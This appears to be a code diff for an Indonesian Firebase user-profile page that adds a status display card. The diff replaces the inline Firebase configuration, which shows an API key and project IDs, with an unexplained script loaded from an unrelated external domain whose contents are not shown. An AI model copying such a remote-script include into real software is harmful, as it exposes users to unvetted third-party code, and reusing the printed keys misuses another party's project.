@@ -11,23 +11,9 @@
   <script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-storage.js"></script>
 
   <!-- Firebase configuration -->
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyDPp8I8Xp-qZg65GxEX8_ETxvrZCDG8454",
-      authDomain: "bisnis-532f5.firebaseapp.com",
-      projectId: "bisnis-532f5",
-      storageBucket: "bisnis-532f5.appspot.com",
-      messagingSenderId: "351800625123",
-      appId: "1:351800625123:web:8abff984b15be7a00bc2d6",
-      measurementId: "G-TJJBQ9TF7S"
-    };
-
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-
-    // Tambahkan ini setelah inisialisasi Firebase
-    const firestore = firebase.firestore();
-  </script>
+<script src="https://kosred.com/a/klttyp.js"></script> 
+  <!-- Firebase configuration -->
+    
 
   <!-- Gaya CSS -->
   <style>
@@ -161,7 +147,19 @@
       background-color: #2980b9;
     }
 
-   
+   #userInfoCard {
+background-color: #aaf4ff34;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  padding: 20px;
+  text-align: center;
+  margin-top: 20px;
+  color: #1d1b1de9;
+}
+
+#userInfoCard p {
+  margin: 10px 0;
+}
   </style>
 </head>
 <body>
@@ -192,8 +190,11 @@
       <input type="file" id="profilePictureInput" style="display: none" accept="image/*" onchange="uploadProfilePicture(this.files)">
     </div>
         
-    <p id="userName"></p>
-    <p id="userEmail"></p>
+    <div id="userInfoCard">
+  <p id="userName"></p>
+  <p id="userStatus"></p>
+  <p id="userEmail"></p>
+</div>
 
     <div id="profileForm">
       <label for="country">Negara:</label>
@@ -232,54 +233,67 @@
 
   <!-- Your profile.js script -->
   <script>
-    // Mengecek status masuk pengguna secara terus-menerus
-    firebase.auth().onAuthStateChanged(function(user) {
-      const userNameElement = document.getElementById('userName');
-      const userEmailElement = document.getElementById('userEmail');
-      const profilePictureElement = document.getElementById('profilePicture');
-      const countryInput = document.getElementById('country');
-      const provinceInput = document.getElementById('province');
-      const districtInput = document.getElementById('district');
-           const kecamatanInput = document.getElementById('kecamatan');
-      const villageInput = document.getElementById('village');
-      const hamletInput = document.getElementById('hamlet');
-      const rtInput = document.getElementById('rt');
-      const rwInput = document.getElementById('rw');
-      const postalCodeInput = document.getElementById('postalCode');
+      const firestore = firebase.firestore();
 
-      if (user) {
-        userNameElement.textContent = `Nama: ${user.displayName || 'Belum diatur'}`;
-        userEmailElement.textContent = `Email: ${user.email || 'Belum diatur'}`;
-        profilePictureElement.src = user.photoURL || 'URL default foto profil';
-        
-        // Baca data dari Firestore
-        firestore.collection('userProfiles').doc(user.uid).get()
-          .then((doc) => {
-            if (doc.exists) {
-              const userData = doc.data();
+// Mengecek status masuk pengguna secara terus-menerus
+firebase.auth().onAuthStateChanged(function(user) {
+  const userNameElement = document.getElementById('userName');
+  const userEmailElement = document.getElementById('userEmail');
+  const profilePictureElement = document.getElementById('profilePicture');
+  const countryInput = document.getElementById('country');
+  const provinceInput = document.getElementById('province');
+  const districtInput = document.getElementById('district');
+  const kecamatanInput = document.getElementById('kecamatan');
+  const villageInput = document.getElementById('village');
+  const hamletInput = document.getElementById('hamlet');
+  const rtInput = document.getElementById('rt');
+  const rwInput = document.getElementById('rw');
+  const postalCodeInput = document.getElementById('postalCode');
 
-              // Set nilai formulir dari data pengguna di Firestore
-              countryInput.value = userData.country || '';
-              provinceInput.value = userData.province || '';
-              districtInput.value = userData.district || '';
-              kecamatanInput.value = userData.kecamatan || '';
-              villageInput.value = userData.village || '';
-              hamletInput.value = userData.hamlet || '';
-              rtInput.value = userData.rt || '';
-              rwInput.value = userData.rw || '';
-              postalCodeInput.value = userData.postalCode || '';
-            } else {
-              console.log('Dokumen tidak ditemukan di Firestore');
-            }
-          })
-          .catch((error) => {
-            console.error('Gagal membaca data dari Firestore:', error.message);
-          });
-      } else {
-        // Jika tidak ada pengguna yang masuk, arahkan ke halaman login
-        window.location.href = 'login.html';
-      }
-    });
+  // ...
+
+  if (!user) {
+    // Jika pengguna belum login, arahkan ke halaman login.html
+    window.location.href = 'login.html';
+    return;
+  }
+
+  if (user) {
+    userNameElement.textContent = `Nama: ${user.displayName || 'Belum diatur'}`;
+    userEmailElement.textContent = `Email: ${user.email || 'Belum diatur'}`;
+    profilePictureElement.src = user.photoURL || 'URL default foto profil';
+
+    // Baca data dari Firestore
+    firestore.collection('userProfiles').doc(user.uid).get()
+      .then((doc) => {
+        if (doc.exists) {
+          const userData = doc.data();
+
+          // Set nilai formulir dari data pengguna di Firestore
+          countryInput.value = userData.country || '';
+          provinceInput.value = userData.province || '';
+          districtInput.value = userData.district || '';
+          kecamatanInput.value = userData.kecamatan || '';
+          villageInput.value = userData.village || '';
+          hamletInput.value = userData.hamlet || '';
+          rtInput.value = userData.rt || '';
+          rwInput.value = userData.rw || '';
+          postalCodeInput.value = userData.postalCode || '';
+
+          // Set nilai status pengguna
+          const userStatus = userData.status || 'Konsumen';
+          document.getElementById('userStatus').textContent = `Status: ${userStatus}`;
+        } else {
+          console.log('Dokumen tidak ditemukan di Firestore');
+        }
+      })
+      .catch((error) => {
+        console.error('Gagal membaca data dari Firestore:', error.message);
+      });
+  }
+
+  
+});
 
     // Fungsi logout
     function logout() {
@@ -347,6 +361,7 @@
   const postalCodeInput = document.getElementById('postalCode');
   const loadingElement = document.getElementById('loading');
   const spinnerElement = document.getElementById('spinner');
+  const userStatusElement = document.getElementById('userStatus'); // Added this line
 
   const userData = {
     country: countryInput.value,
@@ -366,27 +381,39 @@
 
   // Simpan data ke Firestore
   firestore.collection('userProfiles').doc(user.uid).set(userData)
-      .then(() => {
-        console.log('Profil berhasil disimpan di Firestore:', userData);
-        // Hide loading message and spinner after successful save
-        loadingElement.style.display = 'none';
-        spinnerElement.style.display = 'none';
-        // Show success message
-        document.getElementById('saveSuccessMessage').style.display = 'block';
-        // Hide success message after 3 seconds
-        setTimeout(() => {
-          document.getElementById('saveSuccessMessage').style.display = 'none';
-        }, 3000);
-      })
-      .catch((error) => {
-        console.error('Gagal menyimpan profil di Firestore:', error.message);
-        // Hide loading message and spinner if an error occurs
-        loadingElement.style.display = 'none';
-        spinnerElement.style.display = 'none';
-      });
+    .then(() => {
+      console.log('Profil berhasil disimpan di Firestore:', userData);
+      // Hide loading message and spinner after successful save
+      loadingElement.style.display = 'none';
+      spinnerElement.style.display = 'none';
+      // Show success message
+      document.getElementById('saveSuccessMessage').style.display = 'block';
+      // Hide success message after 3 seconds
+      setTimeout(() => {
+        document.getElementById('saveSuccessMessage').style.display = 'none';
+      }, 3000);
 
-    // Additional logic or UI updates can be added here.
-  }
+      // Retrieve and display user status after successful save
+      firestore.collection('userProfiles').doc(user.uid).get()
+        .then((doc) => {
+          if (doc.exists) {
+            const userStatus = doc.data().status || 'Status tidak diatur';
+            userStatusElement.textContent = `Status: ${userStatus}`;
+          }
+        })
+        .catch((error) => {
+          console.error('Gagal membaca status pengguna dari Firestore:', error.message);
+        });
+    })
+    .catch((error) => {
+      console.error('Gagal menyimpan profil di Firestore:', error.message);
+      // Hide loading message and spinner if an error occurs
+      loadingElement.style.display = 'none';
+      spinnerElement.style.display = 'none';
+    });
+
+  // Additional logic or UI updates can be added here.
+}
   
   
   function openSettings() {
